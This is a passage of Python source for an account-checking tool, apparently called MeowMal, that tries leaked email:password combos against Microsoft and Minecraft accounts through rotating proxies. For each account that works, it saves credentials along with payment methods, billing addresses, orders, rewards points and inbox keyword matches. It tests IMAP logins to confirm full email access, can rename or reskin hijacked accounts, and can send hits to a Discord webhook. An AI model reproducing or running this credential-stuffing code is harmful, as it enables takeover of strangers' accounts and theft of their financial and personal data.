                        pass
            return None
        def check_rewards():
            if config.get('check_rewards_points', True):
                points = checker.check_rewards_points()
                if points:
                    write_dedupe(fname, 'Ms_Points.txt', f'{email}:{password} | Points: {points}\n')
                    return ('rewards_points', points)
            return None
        def check_payment():
            if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
                instruments = checker.check_payment_instruments()
                if instruments:
                    return ('payment_methods', instruments)
            return None
        def check_subs():
            if config.get('check_subscriptions'):
                subs = checker.check_subscriptions()
                if subs:
                    write_dedupe(fname, 'Subscriptions.txt', f"{email}:{password} | Subs: {', '.join(subs)}\n")
                    return ('subscriptions', subs)
            return None
        def check_orders():
            if config.get('check_orders') or config.get('check_purchase_history'):
                orders = checker.check_order_history()
                if orders:
                    block = f'{email}:{password}\n'
                    for order in orders:
                        block += f'  - {order}\n'
                    block += '----------------------------------------\n'
                    write_dedupe(fname, 'Order_History.txt', block)
                    return ('orders', orders)
            return None
        def check_billing():
            if config.get('check_billing_address'):
                addresses = checker.check_billing_address()
                if addresses:
                    write_dedupe(fname, 'Billing_Addresses.txt', f"{email}:{password} | Address: {'; '.join(addresses)}\n")
                    return ('billing_addresses', addresses)
            return None
        def check_inbox():
            if config.get('scan_inbox'):
                keywords_str = config.get('inbox_keywords', '')
                if keywords_str:
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                    inbox_results = checker.check_inbox(keywords)
                    if inbox_results:
                        formatted_results = ', '.join([f'{k} {v}' for k, v in inbox_results])
                        write_dedupe(fname, 'inboxes.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
                        return ('inbox_results', inbox_results)
            return None

        try:
            check_balance()
        except: pass
        try:
            check_rewards()
        except: pass
        try:
            check_payment()
        except: pass
        try:
            check_subs()
        except: pass
        try:
            check_orders()
        except: pass
        try:
            check_billing()
        except: pass
        try:
            check_inbox()
        except: pass
        
        return results
    except (OSError, IOError, PermissionError) as e:
        return {'balance': None}
    except Exception as e:
        return {'balance': None}
class ConfigLoader:
    def __init__(self, config_file='config.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self._config_cache = None
        self._cache_timestamp = 0
        self._cache_timeout = 60
        self.load_config()
    def load_config(self):
        current_time = time.time()
        if self._config_cache is not None and current_time - self._cache_timestamp < self._cache_timeout and os.path.exists(self.config_file):
            self.settings = self._config_cache.copy()
            return True
        if not os.path.exists(self.config_file):
            self.create_default_config()
            return False
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.update_config_schema()
            self.parse_all_sections()
            self._config_cache = self.settings.copy()
            self._cache_timestamp = current_time
            return True
        except (configparser.Error, IOError, OSError):
            self.create_default_config()
            return False
    def create_default_config(self):
        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
        self.config = configparser.ConfigParser()
        self.update_config_schema()
        print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
    def update_config_schema(self):
        defaults = {
            'General': {
                'threads': '100',
                'timeout': '15',
                'max_retries': '4',
                'use_proxies': 'False'
            },
            'Performance': {
                'optimize_network': 'True',
                'connection_pool_size': '100',
                'dns_cache_enabled': 'True',
                'keep_alive_enabled': 'True'
            },
            'Proxy': {
                'Auto_Proxy': 'False',
                'Proxy_Api': '',
                'Request_Num': '3',
                'Proxy_Time': '5',
                'proxy_rotation': 'True',
                'verify_ssl': 'False'
            },
            'Features': {
                'check_xbox_game_pass': 'True',
                'check_xbox_game_pass_ultimate': 'True',
                'check_minecraft_ownership': 'True',
                'check_minecraft_capes': 'True',
                'check_optifine_cape': 'True',
                'check_name_change': 'True',
                'check_last_name_change': 'True',
                'check_hypixel_rank': 'True',
                'check_hypixel_level': 'True',
                'check_hypixel_first_login': 'True',
                'check_hypixel_last_login': 'True',
                'check_hypixel_ban_status': 'True',
                'check_bedwars_stars': 'True',
                'check_skyblock_coins': 'True',
                'check_skyblock_networth': 'True',
                'check_payment': 'False',
                'check_credit_cards': 'False',
                'check_paypal': 'False',
                'check_billing_address': 'False',
                'check_subscriptions': 'False',
                'check_purchase_history': 'False',
                'check_microsoft_balance': 'False',
                'check_reward_points': 'False',
                'check_orders': 'False',
                'check_payment_methods': 'False',

                'check_email_access': 'True',
                'check_two_factor': 'True'
            },
            'Inbox': {
                'scan_inbox': 'False',
                'inbox_keywords': 'steam, netflix, Crunchyroll',
                'max_inbox_messages': '50',
                'save_full_emails': 'False'
            },
            'BanChecking': {
                'enable_ban_checking': 'True',
                'hypixelban': 'True',
                'use_ban_proxies': 'False'
            },
            'Data_Collection': {
                'hypixel_name': 'True',
                'hypixel_level': 'True',
                'first_hypixel_login': 'True',
                'last_hypixel_login': 'True',
                'optifine_cape': 'True',
                'minecraft_capes': 'True',
                'email_access': 'True',
                'hypixel_skyblock_coins': 'True',
                'hypixel_bedwars_stars': 'True',
                'hypixel_ban': 'True',
                'name_change_availability': 'True',
                'last_name_change': 'True',
                'payment': 'False'
            },
            'File_Output': {
                'save_hits': 'True',
                'save_bad': 'True',
                'save_valid_mail': 'True',
                'save_2fa': 'True',
                'save_banned': 'True',
                'save_unbanned': 'True',
                'save_mfa': 'True',
                'save_sfa': 'True',
                'save_normal_minecraft': 'True',
                'save_xbox_game_pass': 'True',
                'save_xbox_game_pass_ultimate': 'True',
                'save_other': 'True',
                'create_capture_file': 'True',
                'create_separate_files': 'True'
            },
            'Discord': {
                'enable_notifications': 'False',
                'discord_webhook_url': '',
                'webhook_username': 'MeowMal Checker',
                'webhook_avatar_url': 'https://i.imgur.com/4M34hi2.png',
                'notify_on_hit': 'True',
                'notify_on_game_pass': 'True',
                'notify_on_payment': 'False',
                'notify_on_2fa': 'False',
                'notify_on_mfa': 'True',
                'notify_on_hypixel_rank': 'True',
                'embed_color_hit': '#57F287',
                'embed_color_xgp': '#3498DB',
                'embed_thumbnail': 'True',
                'embed_footer': 'True',
                'embed_thumbnail_url': 'https://i.imgur.com/4M34hi2.png',
                'embed_image_enabled': 'True',
                'embed_image_template': 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'
            },
            'Security': {
                'mark_mfa': 'True',
                'mark_sfa': 'True'
            },
            'RateLimit': {
                'delay_between_checks': '0',
                'random_delay': 'True',
                'min_delay': '0',
                'max_delay': '2',
                'respect_429': 'True',
                'pause_on_429': '20',
                'random_user_agent': 'True',
                'warn_on_slow_check': 'False',
                'slow_check_warn_seconds': '75'
            },
            'Filters': {
                'min_hypixel_level': '0',
                'min_bedwars_stars': '0',
                'min_skyblock_coins': '0',
                'min_account_balance': '0',
                'require_payment_method': 'False',
                'require_full_access': 'False',
                'require_unbanned': 'False'
            },
            'AutoOps': {
                'auto_set_name': 'False',
                'custom_name_format': 'MeowMal_{random_letter}_{random_number}',
                'auto_set_skin': 'False',
                'skin_url': 'http://textures.minecraft.net/texture/example',
                'skin_variant': 'classic'
            },
            'DonutSMP': {
                'donut_stats': 'False',
                'donut_api_key': ''
            },
            'UI': {
                'show_live_logs': 'True',
                'print_to_console': 'True',
                'colored_output': 'True',
                'verbose_mode': 'False',
                'theme': 'blue'
            }
        }
        updated = False
        for section, options in defaults.items():
            if not self.config.has_section(section):
                self.config.add_section(section)
                updated = True
            for key, value in options.items():
                if not self.config.has_option(section, key):
                    self.config.set(section, key, str(value))
                    updated = True
        if updated:
            try:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    self.config.write(f)
                pass
            except Exception as e:
                print(f'{Fore.YELLOW}⚠ Could not update config schema: {e}{Fore.RESET}')
    def parse_all_sections(self):
        for section in self.config.sections():
            for key, value in self.config.items(section):
                try:
                    self.settings[key] = self.parse_value(value)
                except (ValueError, TypeError):
                    continue
    def parse_value(self, value):
        if not isinstance(value, str):
            return value
        value = value.strip()
        if value.lower() in ('true', 'yes', '1', 'on'):
            return True
        if value.lower() in ('false', 'no', '0', 'off'):
            return False
        try:
            if '.' not in value:
                return int(value)
            return float(value)
        except ValueError:
            pass
        return value
    def get(self, key, default=None):
        return self.settings.get(key, default)
    def get_proxy_config(self):
        return {'auto_proxy': self.get('auto_proxy', False), 'proxy_api': self.get('proxy_api', ''), 'request_num': self.get('request_num', 3), 'proxy_time': self.get('proxy_time', 5)}
    def get_checker_config(self):
        return {'hypixelname': self.get('check_hypixel_rank', True), 'hypixellevel': self.get('check_hypixel_level', True), 'hypixelfirstlogin': self.get('check_hypixel_first_login', True), 'hypixellastlogin': self.get('check_hypixel_last_login', True), 'hypixelban': self.get('check_hypixel_ban_status', True), 'hypixelbwstars': self.get('check_bedwars_stars', True), 'hypixelsbcoins': self.get('check_skyblock_coins', True), 'payment': self.get('check_payment', True), 'access': self.get('check_email_access', True), 'optifinecape': self.get('check_optifine_cape', True), 'namechange': self.get('check_name_change', True), 'lastchanged': self.get('check_last_name_change', True), 'setname': self.get('auto_set_name', False), 'name': self.get('custom_name_format', 'MeowMal'), 'setskin': self.get('auto_set_skin', False), 'skin': self.get('skin_url', 'http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb'), 'variant': self.get('skin_variant', 'classic'), 'mark_mfa': self.get('mark_mfa', True), 'mark_sfa': self.get('mark_sfa', True), 'donut_stats': self.get('donut_stats', True), 'donut_api_key': self.get('donut_api_key', ''), 'save_bad': self.get('save_bad', False)}
    def get_general_config(self):
        return {'max_retries': self.get('max_retries', 3), 'timeout': self.get('timeout', 15), 'threads': self.get('threads', 10), 'use_proxies': self.get('use_proxies', False)}
    def get_capture_config(self):
        return {'hypixel_name': self.get('hypixel_name', True), 'hypixel_level': self.get('hypixel_level', True), 'first_hypixel_login': self.get('first_hypixel_login', True), 'last_hypixel_login': self.get('last_hypixel_login', True), 'optifine_cape': self.get('optifine_cape', True), 'minecraft_capes': self.get('minecraft_capes', True), 'email_access': self.get('email_access', True), 'hypixel_skyblock_coins': self.get('hypixel_skyblock_coins', True), 'hypixel_bedwars_stars': self.get('hypixel_bedwars_stars', True), 'hypixel_ban': self.get('hypixel_ban', True), 'name_change_availability': self.get('name_change_availability', True), 'last_name_change': self.get('last_name_change', True), 'payment': self.get('payment', True), 'donut_stats': self.get('donut_stats', True)}
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
Combos = []
proxylist = []
banproxies = []
fname = ''
screen = "'2'"
proxytype = "'4'"
proxy_api_url = ''
auto_proxy = False
proxy_request_num = 3
proxy_time = 5
last_proxy_fetch = 0
proxy_refresh_time = 5
DONUT_API_URL = 'https://api.donutsmp.net/v1/stats/'
api_socks4 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt']
api_socks5 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt']
api_http = ['https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt', 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt']
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, automarklost = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0)
stats_lock = threading.Lock()
urllib3.disable_warnings()
warnings.filterwarnings('ignore')
def is_no_proxy():
    pt = str(proxytype).strip()
    pt = pt.replace("'", '').replace('"', '')
    return pt == '4'
class Config:
    def __init__(self):
        self.data = {}
    def set(self, key, value):
        self.data[key] = value
    def get(self, key, default=None):
        return self.data.get(key, default)
config = Config()
class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.namechange_available = None
        self.lastchanged = None
        self.ms_balance = None
        self.ms_rewards = None
        self.ms_orders = []
        self.ms_payment_methods = []
        self.inbox_matches = []
        self.ban_checked = False
    def builder(self, mask_password=False, include_timestamp=False):
        if self.banned is None:
            ban_status = '[Unknown]'
        elif str(self.banned).startswith('[Error]'):
            ban_status = '[Unknown]'
        elif self.banned and self.banned != 'False':
            ban_status = '[Banned]'
        else:
            ban_status = '[Unbanned]'
        tags = []
        if self.type:
            type_upper = str(self.type).upper()
            if 'GAME PASS' in type_upper or 'XGP' in type_upper:
                if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                    tags.append('[XGPU]')
                else:
                    tags.append('[XGP]')
            if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                tags.append('[MC]')
        if hasattr(self, 'sfa') and self.sfa:
            tags.append('[SFA]')
        if 'NFA' in str(self.type):
            tags.append('[NFA]')
        elif 'SFA' in str(self.type):
            tags.append('[SFA]')
        elif 'UFA' in str(self.type):
            tags.append('[UFA]')
        if self.capes and self.capes != '':
            tags.append(f'[{self.capes}]')
        if self.cape and self.cape == 'Yes':
            tags.append('[Optifine]')
        if hasattr(self, 'sbcoins') and self.sbcoins or (hasattr(self, 'sbnetworth') and self.sbnetworth):
            tags.append('[Skyblock]')
        if hasattr(self, 'swstars') and self.swstars:
            tags.append('[SkyWars]')
        if hasattr(self, 'dungeons') and self.dungeons:
            tags.append('[Dungeons]')
        hypixel_level = ''
        if self.level and float(self.level) > 0:
            hypixel_level = f'[Lvl:{self.level}]'
        if mask_password:
            if len(self.password) > 4:
                password_display = self.password[:2] + '*' * (len(self.password) - 4) + self.password[-2:]
            else:
                password_display = '*' * len(self.password)
        else:
            password_display = self.password
        stats_parts = []
        if self.bwstars and int(self.bwstars) > 0:
            stats_parts.append(f'BW: {self.bwstars}')
        if hasattr(self, 'swstars') and self.swstars and (str(self.swstars) not in ('N/A', '', '0')) and (int(self.swstars) > 0):
            stats_parts.append(f'SW: {self.swstars}')
        if hasattr(self, 'sbcoins') and self.sbcoins and (str(self.sbcoins) not in ('N/A', '', 'None')):
            stats_parts.append(f'Sb_Coins: {self.sbcoins}')
        if hasattr(self, 'sbnetworth') and self.sbnetworth and (str(self.sbnetworth) not in ('N/A', '', 'None')):
            stats_parts.append(f'Sb_Networth: {self.sbnetworth}')
        if hasattr(self, 'pitcoins') and self.pitcoins and (str(self.pitcoins) not in ('N/A', '', 'None')):
            stats_parts.append(f'Pit_Coins: {self.pitcoins}')
        tags_str = ''.join(tags)
        stats_str = ', '.join(stats_parts) if stats_parts else ''
        if self.hypixl and self.hypixl != 'N/A':
            user_display = self.hypixl
        else:
            user_display = self.name if self.name and self.name != 'N/A' else 'Unknown'
        capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
        if include_timestamp:
            import time
            from datetime import datetime
            if hasattr(ui, 'start_time') and ui.start_time:
                elapsed = time.time() - ui.start_time
                hours = int(elapsed // 3600)
                minutes = int(elapsed % 3600 // 60)
                seconds = int(elapsed % 60)
                elapsed_time = f'[{hours:02d}:{minutes:02d}:{seconds:02d}]'
            else:
                elapsed_time = '[00:00:00]'
            capture_line = f'{elapsed_time} {capture_line}'
        if stats_str:
            capture_line += f' [Hypixel: {stats_str}]'
        return capture_line
    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                try:
                    proxy_to_use = getproxy() if not is_no_proxy() else None
                    resp = self.session.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=proxy_to_use, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept-Encoding': 'gzip, deflate'}, verify=False, timeout=(5, 8))
                    tx = resp.text
                except Exception:
                    raise
                try:
                    if config.get('hypixelname'):
                        match = HYPIXEL_NAME.search(tx)
                        if match:
                            self.hypixl = match.group()
                            match_title = HYPIXEL_TITLE.search(tx)
                            if match_title:
                                self.hypixl = match_title.group(1)
                            else:
                                try:
                                    pattern = r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(self.name)
                                    match_brute = re.search(pattern, tx, re.IGNORECASE)
                                    if match_brute:
                                        self.hypixl = match_brute.group(0) 
                                except:
                                    pass
                except:
                    pass
                try:
                    if config.get('hypixellevel'):
                        match = HYPIXEL_LEVEL.search(tx)
                        if match:
                            self.level = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelfirstlogin'):
                        match = FIRST_LOGIN.search(tx)
                        if match:
                            self.firstlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixellastlogin'):
                        match = LAST_LOGIN.search(tx)
                        if match:
                            self.lastlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelbwstars'):
                        match = BW_STARS.search(tx)
                        if match:
                            self.bwstars = match.group()
                except:
                    pass
            if False and config.get('hypixelsbcoins'):
                try:
                    req = self.session.get('https://sky.shiiyu.moe/stats/' + self.name, proxies=getproxy() if not is_no_proxy() else None, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}, verify=False, timeout=(5, 8))
                    if req.status_code == 200:
                        match = SB_NETWORTH.search(req.text)
                        if match:
                            self.sbcoins = match.group()
                        else:
                            self.sbcoins = 'N/A'
                    else:
                        self.sbcoins = 'N/A'
                except:
                    self.sbcoins = 'N/A'
        except:
            errors += 1
    def optifine(self):
        if config.get('optifinecape') and config.get('optifine_cape', True):
            try:
                txt = self.session.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text
                if 'Not found' in txt:
                    self.cape = 'No'
                else:
                    self.cape = 'Yes'
            except:
                self.cape = 'Unknown'
    def full_access(self):
        global mfa, sfa
        if config.get('access') and config.get('email_access', True):
            try:
                try:
                    domain = self.email.split('@')[1].lower()
                except IndexError:
                    self.access = 'False'
                    sfa += 1
                    return
                imap_server = ''
                if 'gmail.com' in domain or 'googlemail.com' in domain:
                    imap_server = 'imap.gmail.com'
                elif 'yahoo' in domain:
                    imap_server = 'imap.mail.yahoo.com'
                elif 'outlook' in domain or 'hotmail' in domain or 'live' in domain:
                    imap_server = 'outlook.office365.com'
                elif 'icloud' in domain or 'me.com' in domain or 'mac.com' in domain:
                    imap_server = 'imap.mail.me.com'
                elif 'aol.com' in domain:
                    imap_server = 'imap.aol.com'
                else:
                    imap_server = f'imap.{domain}'
                if not imap_server:
                     imap_server = f'imap.{domain}'
                try:
                    mail = imaplib.IMAP4_SSL(imap_server, timeout=10)
                    mail.login(self.email, self.password)
                    mail.logout()
                    self.access = 'True'
                    mfa += 1
                    if config.get('mark_mfa', True):
                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
                        with file_lock:
                            with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
                                 f.write(f'{self.email}:{self.password}{rank_str}\n')
                except imaplib.IMAP4.error:
                    sfa += 1
                    self.access = 'False'
                    if config.get('mark_sfa', True):
                        write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
                except Exception as e:
                    self.access = 'Unknown'
            except:
                self.access = 'Unknown'
    def namechange(self):
        global retries
        if (config.get('namechange') or config.get('lastchanged')) and (config.get('name_change_availability', True) or config.get('last_name_change', True)):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, timeout=10)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') and config.get('name_change_availability', True):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                                self.namechange_available = data.get('nameChangeAllowed', False)
                            if config.get('lastchanged') and config.get('last_name_change', True):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%S.%fZ')
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%SZ')
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime('%m/%d/%Y')
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = difference.days % 365 // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {('year' if years == 1 else 'years')} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {('month' if months == 1 else 'months')} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {('day' if days == 1 else 'days')} - {formatted} - {created_at}"
                                    break
                        except:
                            pass
                    if check.status_code == 429:
                        if len(proxylist) < 5:
                            time.sleep(0.5)
                except:
                    pass
                tries += 1
    def check_donut_smp(self):
        if not config.get('donut_stats', True):
            return
        if not self.name or self.name == 'N/A':
            if UI_ENABLED and ui:
                ui.log_info('Donut SMP: skipped (username unavailable)')
            return
        try:
            donut_api_url = DONUT_API_URL
            donut_api_key = config.get('donut_api_key')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
            if donut_api_key:
                headers['Authorization'] = f'Bearer {donut_api_key}'
            try:
                proxy_config = getproxy() if proxytype != "'4'" else None
            except Exception:
                proxy_config = None
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP: Proxy error, trying without proxy')
            session = requests.Session()
            retries = Retry(total=3, backoff_factor=0.75, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=['GET'], respect_retry_after_header=True, raise_on_status=False)
            adapter = HTTPAdapter(max_retries=retries)
            session.mount('https://', adapter)
            session.mount('http://', adapter)
            proxy_candidates = []
            if proxytype != "'4'":
                try:
                    for _ in range(4):
                        p = getproxy()
                        if p:
                            proxy_candidates.append(p)
                except Exception:
                    pass
            unique = []
            seen = set()
            for p in proxy_candidates:
                key = str(p)
                if key not in seen:
                    seen.add(key)
                    unique.append(p)
            proxy_candidates = unique + [None]
            valid_proxies = []
            for p in proxy_candidates:
                try:
                    r = session.get('https://api.donutsmp.net/index.html', headers=headers, proxies=p, verify=False, timeout=10)
                    if r.status_code == 200:
                        valid_proxies.append(p)
                    elif UI_ENABLED and ui:
                        ui.log_info(f"Donut SMP: preflight {r.status_code}{(' (no proxy)' if p is None else '')}")
                except Exception as e:
                    if UI_ENABLED and ui:
                        ui.log_info(f"Donut SMP: preflight failed {('(no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
            if not valid_proxies:
                valid_proxies = [None]
            response = None
            for idx, p in enumerate(valid_proxies):
                try:
                    r = session.get(f'{donut_api_url}{self.name}', headers=headers, proxies=p, verify=False, timeout=20)
                    time.sleep(0.3 * (idx + 1))
                    if r.status_code == 200 or r.status_code in (401, 404, 429):
                        response = r
                        break
                    else:
                        if UI_ENABLED and ui:
                            ui.log_info(f"Donut SMP: server error {r.status_code} on attempt {idx + 1}{(' (no proxy)' if p is None else '')}")
                        continue
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RetryError, requests.exceptions.ProxyError, requests.exceptions.SSLError, requests.exceptions.InvalidSchema) as e:
                    if UI_ENABLED and ui:
                        ui.log_info(f"Donut SMP: connection failed on attempt {idx + 1}{(' (no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
                    continue
            if response is None:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection failed after retries')
                return
            if response.status_code == 200:
                try:
                    data = response.json()
                except Exception:
                    data = None
                stats_data = None
                if isinstance(data, dict):
                    if 'result' in data and isinstance(data['result'], dict):
                        stats_data = data['result']
                if isinstance(stats_data, dict):
                    stats_lines = []
                    stats_lines.append(f'{self.email}:{self.password}')
                    stats_lines.append(f'Username: {self.name}')
                    if stats_data.get('broken_blocks'):
                        stats_lines.append(f"broken_blocks: {stats_data['broken_blocks']}")
                    if stats_data.get('deaths'):
                        stats_lines.append(f"deaths: {stats_data['deaths']}")
                    if stats_data.get('kills'):
                        stats_lines.append(f"kills: {stats_data['kills']}")
                    if stats_data.get('mobs_killed'):
                        stats_lines.append(f"mobs_killed: {stats_data['mobs_killed']}")
                    if stats_data.get('money'):
                        stats_lines.append(f"money: {stats_data['money']}")
                    if stats_data.get('money_made_from_sell'):
                        stats_lines.append(f"money_made_from_sell: {stats_data['money_made_from_sell']}")
                    if stats_data.get('money_spent_on_shop'):
                        stats_lines.append(f"money_spent_on_shop: {stats_data['money_spent_on_shop']}")
                    if stats_data.get('placed_blocks'):
                        stats_lines.append(f"placed_blocks: {stats_data['placed_blocks']}")
                    if stats_data.get('playtime'):
                        try:
                            raw_playtime = stats_data['playtime']
                            formatted_playtime = self._format_seconds(raw_playtime)
                            stats_lines.append(f'playtime: {raw_playtime} ({formatted_playtime})')
                        except Exception:
                            stats_lines.append(f"playtime: {stats_data['playtime']}")
                    if self.banned is not None:
                        if self.banned and self.banned != 'False':
                            stats_lines.append('banned: true')
                            if self.banned not in ('True', 'true', True):
                                ban_info = self._parse_ban_info(self.banned)
                                if ban_info.get('ban_id'):
                                    stats_lines.append(f"ban_id: {ban_info['ban_id']}")
                                if ban_info.get('duration'):
                                    stats_lines.append(f"ban_duration: {ban_info['duration']}")
                            else:
                                stats_lines.append('ban_duration: Unknown')
                        else:
                            stats_lines.append('banned: false')
                    if len(stats_lines) > 2:
                        with file_lock:
                            with open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8') as f:
                                f.write('\n'.join(stats_lines))
                                f.write('\n' + '=' * 50 + '\n')
                        if UI_ENABLED and ui:
                            ui.log_info(f'Donut SMP stats saved for {self.name}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP: player not found')
            elif response.status_code == 401:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Invalid API key')
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Rate limited')
        except requests.exceptions.RequestException as e:
            if 'Max retries exceeded' in str(e):
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection failed after retries')
            elif 'Connection' in str(e) or 'Timeout' in str(e):
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection timeout')
            elif UI_ENABLED and ui:
                ui.log_info('Donut SMP API: Request failed')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_info(f'Donut SMP error: {str(e)[:100]}')
    def check_microsoft_features(self):
        global retries
        try:
            if config.get('check_microsoft_balance') or config.get('check_rewards_points', True) or config.get('check_payment_methods') or config.get('check_subscriptions') or config.get('check_orders') or config.get('check_billing_address') or config.get('scan_inbox'):
                results = check_microsoft_account(self.session, self.email, self.password, config, fname)
                self.ms_balance = results.get('balance')
                self.ms_rewards = results.get('rewards_points')
                self.ms_payment_methods = results.get('payment_methods', [])
                self.ms_orders = results.get('orders', [])
                self.inbox_matches = results.get('inbox_results', [])
        except Exception as e:
            retries += 1
    def ban(self, session):
        global errors
        if not MINECRAFT_AVAILABLE:
            self.banned = '[Error] pyCraft Missing'
            return
        if not config.get('hypixelban'):
            return
        if self.ban_checked:
            return
        self.ban_checked = True
        try:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
                
                original_handle_exception = connection._handle_exception
                def safe_handle_exception(e, exc_info):
                    try:
                        error_str = str(e)
                        if 'RateLimiter disallowed' in error_str or '429' in error_str:
                            try:
                                self.banned = '[Error] Rate Limit'
                            except:
                                pass
                            return
                        if 'SSLError' in error_str or 'EOF occurred' in error_str:
                             try:
                                 self.banned = '[Error] Connection/SSL'
                             except:
                                 pass
                             return
                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'winerror') and e.winerror == 10053):
                            return
                        if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                            return
                        if isinstance(e, ValueError) and "closed file" in error_str:
                            return
                        if isinstance(e, requests.exceptions.RequestException):
                            try:
                                 self.banned = '[Error] Connection'
                            except:
                                 pass
                            return
